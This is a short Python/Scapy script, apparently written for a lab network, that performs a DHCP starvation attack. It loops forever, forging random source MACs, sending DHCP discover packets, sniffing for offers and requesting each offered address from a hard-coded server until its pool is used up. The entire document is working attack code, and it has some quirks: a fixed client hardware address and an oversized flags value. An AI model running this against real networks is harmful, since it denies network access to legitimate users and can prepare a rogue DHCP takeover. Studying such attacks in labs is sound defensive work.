from scapy.all import *
import random
import time

dhcp_ip = "10.1.1.253"
dhcp_mac = "08:00:27:e0:92:42"
interface = "enp0s8"

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5)) # truc pour générer un mac aléatoire

while True:
    mac = random_mac()  
    # print(mac)  
    dhcp_attack = (
        Ether(src=mac, dst=dhcp_mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str("00:00:00:00:00:01"),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF) /
        DHCP(options=[("message-type", "discover"), ("end")])
    )
    # dhcp_attack.show()
    sendp(dhcp_attack, iface=interface)

    response = sniff(filter="udp and (port 67 or port 68)", iface=interface, timeout=3, count=1)

    print(response)

    dhcp_request = (
        Ether(src=mac, dst=dhcp_mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str("00:00:00:00:00:01"),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF) /
        DHCP(options=[("message-type", "request"),
                              ("server_id", dhcp_ip),
                              ("requested_addr", response[0][BOOTP].yiaddr),
                              ("end")])
    )
    sendp(dhcp_request, iface=interface)